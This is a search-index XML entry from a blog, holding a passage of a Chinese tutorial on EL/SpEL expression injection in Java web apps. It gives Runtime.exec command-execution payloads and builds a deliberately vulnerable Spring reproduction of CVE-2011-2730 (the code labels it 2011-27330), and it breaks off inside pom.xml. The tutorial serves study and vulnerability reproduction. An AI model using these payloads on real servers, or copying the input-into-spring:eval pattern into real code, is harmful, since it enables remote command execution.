<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>EL 表达式注入</title>
    <link href="/2025/11/17/EL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/11/17/EL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="EL-表达式注入"><a href="#EL-表达式注入" class="headerlink" title="EL 表达式注入"></a>EL 表达式注入</h1><h1 id="1、EL-概述"><a href="#1、EL-概述" class="headerlink" title="1、EL 概述"></a>1、EL 概述</h1><p><strong>表达式语言(Expression Language)</strong> 简称  EL，是 Java EE（尤其是 JSP 技术）中用来<strong>在页面中简化访问 Java 对象、属性、集合和方法</strong>的一种语法。它的主要作用是取代 JSP 页面中复杂的 <code>&lt;%= ... %&gt;</code> 表达式，让 JSP 页面更简洁、可读性更高。  </p><h2 id="1-1-EL-基本语法"><a href="#1-1-EL-基本语法" class="headerlink" title="1.1 EL 基本语法"></a>1.1 EL 基本语法</h2><p><strong>要先通过 page 标签设置不忽略 EI 表达式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> isELIgnored=<span class="hljs-string">&quot;false&quot;</span> %&gt;<br></code></pre></td></tr></table></figure><p><strong>语法：</strong></p><p><strong>EL 表达式使用</strong> <code>${}</code> <strong>或</strong> <code>#{}</code> <strong>语法。</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$&#123;expression&#125;</span><br></code></pre></td></tr></table></figure><p>在 JSP 中我们可以如下写：</p><p>而 JSP 当中有四大域，它们分别是：</p><ul><li>page：当前页面有效</li><li>request：当前请求有效</li><li>session：当前会话有效</li><li>application：当前应用有效</li></ul><p>el 表达式获取数据，会依次从这 4 个域中寻找，直到找到为止。而这四个域对象的作用范围如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171120207.png" alt="img"></p><p>例如： <code>${brands}</code>，el 表达式获取数据，会先从 <code>page</code> 域对象中获取数据，如果没有再到 <code>requet</code> 域对象中获取数据，如果再没有再到 <code>session</code> 域对象中获取，如果还没有才会到 <code>application</code> 中获取数据。</p><h1 id="2、EL-表达式注入漏洞"><a href="#2、EL-表达式注入漏洞" class="headerlink" title="2、EL 表达式注入漏洞"></a>2、EL 表达式注入漏洞</h1><h3 id="2-1-通用-POC："><a href="#2-1-通用-POC：" class="headerlink" title="2.1  通用 POC："></a>2.1  通用 POC：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span><br>$&#123;pageContext&#125;<br><br><span class="hljs-comment">//获取Web路径</span><br>$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>)&#125;<br><br><span class="hljs-comment">//文件头参数</span><br>$&#123;header&#125;<br><br><span class="hljs-comment">//获取webRoot</span><br>$&#123;applicationScope&#125;<br><br><span class="hljs-comment">//执行命令</span><br>$&#123;pageContext.request.getSession().setAttribute(<span class="hljs-string">&quot;a&quot;</span>,pageContext.request.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>).invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>).exec(<span class="hljs-string">&quot;calc&quot;</span>).getInputStream())&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-简单漏洞利用"><a href="#2-2-简单漏洞利用" class="headerlink" title="2.2  简单漏洞利用"></a>2.2  简单漏洞利用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;pageContext.setAttribute(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass()).invoke(<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&quot;calc.exe&quot;</span>))&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.eldemo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><br><span class="hljs-meta">@WebServlet(name = &quot;eldemo&quot;, value = &quot;/eldemo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">eldemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Hello EL!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br><br>        <span class="hljs-comment">//使用 RequestDispatcher 转发到 JSP 页面</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            request.getRequestDispatcher(<span class="hljs-string">&quot;/eldemo.jsp&quot;</span>).forward(request, response);<br>        &#125; <span class="hljs-keyword">catch</span> (ServletException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: XVSHIFU<br>  Date: <span class="hljs-number">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">12</span><br>  Time: <span class="hljs-number">20</span>:<span class="hljs-number">42</span><br>  To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt; EL &lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;h1&gt; EL 注入 测试&lt;/h1&gt;<br><br>$&#123;pageContext.setAttribute(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;&quot;</span>.getClass()).invoke(<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&quot;calc.exe&quot;</span>))&#125;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171122807.png" alt="img"></p><p>这种场景几乎不会遇到，也没有哪个开发者傻乎乎的让我们直接从外部控制 JSP 页面中的 EL 表达式。</p><h3 id="2-3-简单的漏洞场景（CVE-2011-2730）"><a href="#2-3-简单的漏洞场景（CVE-2011-2730）" class="headerlink" title="2.3 简单的漏洞场景（CVE-2011-2730）"></a>2.3 简单的漏洞场景（CVE-2011-2730）</h3><h4 id="2-3-1-漏洞复现"><a href="#2-3-1-漏洞复现" class="headerlink" title="2.3.1 漏洞复现"></a>2.3.1 漏洞复现</h4><p>首先创建一个 spring 项目，构建漏洞场景：</p><p>目录结构：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171122102.png" alt="img"></p><p><strong>VulnController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.cve201127330;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnController</span> &#123;<br><br>    <span class="hljs-comment">//漏洞入口： /search?q=恶意SpEL。将用户输入传入 Model，供 result.jsp 中 &lt;spring:eval&gt; 使用</span><br><br>    <span class="hljs-meta">@RequestMapping(&quot;/search&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;q&quot;, defaultValue = &quot;test&quot;)</span> String q, Model model)</span> &#123;<br>        model.addAttribute(<span class="hljs-string">&quot;input&quot;</span>, q);<br>        <span class="hljs-comment">// 对应 /WEB-INF/views/result.jsp</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;result&quot;</span>;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>spring-servlet.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/context</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- 扫描 Controller --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.src.cve201127330&quot;</span> /&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- 视图解析器：映射逻辑名 → /WEB-INF/views/*.jsp --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;prefix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/WEB-INF/views/&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;suffix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;.jsp&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>web.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee</span></span><br><span class="hljs-string"><span class="hljs-tag">         http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;</span></span><br><span class="hljs-tag"> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.5&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>CVE-2011-27330<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- Spring MVC DispatcherServlet --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>spring<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>spring<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 欢迎页 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>index.jsp</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: XVSHIFU<br>  Date: 2025/11/13<br>  Time: 21:26<br>  To change this template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; %&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CVE-2011-27330 测试入口<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>CVE-2011-27330 复现环境<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;search&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>    输入 SpEL 表达式：<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;q&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;80&quot;</span></span><br><span class="hljs-tag">           <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交（危险！）&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>示例载荷（Windows）<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>T(java.lang.Runtime).getRuntime().exec(&#x27;cmd /c notepad&#x27;)<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>result.jsp</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;%--<br>  <span class="hljs-title class_">Created</span> by <span class="hljs-title class_">IntelliJ</span> <span class="hljs-variable constant_">IDEA</span>.<br>  <span class="hljs-title class_">User</span>: <span class="hljs-variable constant_">XVSHIFU</span><br>  <span class="hljs-title class_">Date</span>: <span class="hljs-number">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">13</span><br>  <span class="hljs-title class_">Time</span>: <span class="hljs-number">21</span>:<span class="hljs-number">26</span><br>  <span class="hljs-title class_">To</span> change <span class="hljs-variable language_">this</span> template use <span class="hljs-title class_">File</span> | <span class="hljs-title class_">Settings</span> | <span class="hljs-title class_">File</span> <span class="hljs-title class_">Templates</span>.<br>  --%&gt;<br>  &lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>    &lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>      &lt;%@ taglib prefix=<span class="hljs-string">&quot;spring&quot;</span> uri=<span class="hljs-string">&quot;http://www.springframework.org/tags&quot;</span> %&gt;<br>        &lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;<br>          &lt;html&gt;<br>            &lt;head&gt;<br>              &lt;title&gt;CVE-2011-27330 Demo&lt;/title&gt;<br>            &lt;/head&gt;<br>            &lt;body&gt;<br>              &lt;h2&gt;[CVE-2011-27330] 搜索结果&lt;/h2&gt;<br><br>              &lt;p&gt;你输入的内容：&lt;strong&gt;$&#123;input&#125;&lt;/strong&gt;&lt;/p&gt;<br><br>              &lt;!-- ⚠️ 漏洞核心：将 $&#123;input&#125; 直接拼接到 SpEL 表达式中 --&gt;<br>                &lt;p&gt;表达式求值结果：&lt;br&gt;<br>                  &lt;spring:eval expression=&quot;&#x27;Hello, &#x27; + $&#123;input&#125;&quot; /&gt;<br>                &lt;/p&gt;<br><br>                  &lt;hr&gt;<br>                    &lt;h3&gt;⚠️ 安全提示&lt;/h3&gt;<br>                    &lt;p&gt;本页面用于漏洞复现研究，实际开发中应避免此类写法！&lt;/p&gt;<br>                  &lt;/body&gt;<br>                &lt;/html&gt;<br></code></pre></td></tr></table></figure><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.src<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>CVE-2011-27330<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 